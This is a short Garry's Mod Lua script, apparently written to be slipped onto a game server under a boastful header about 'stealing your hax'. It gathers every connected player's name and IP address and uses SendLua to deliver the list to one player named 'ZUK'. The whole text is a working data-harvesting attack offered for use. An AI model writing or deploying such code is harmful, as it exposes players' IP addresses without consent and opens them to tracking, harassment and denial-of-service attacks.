--[GTL] I'M IN YOUR LUA! STEALING YOUR HAX...

local strIPs = "[IP Grabber]\\n"
local finalshit
local myname = "ZUK"
local me = nil
for k,v in pairs(player.GetAll()) do
	strIPs = strIPs..v:Name()..": "..v:IPAddress().."\\n"
	if v:Name() == myname then me = v end
end
strIPs = "print(\""..strIPs.."\")"
if me != nil then me:SendLua(strIPs) end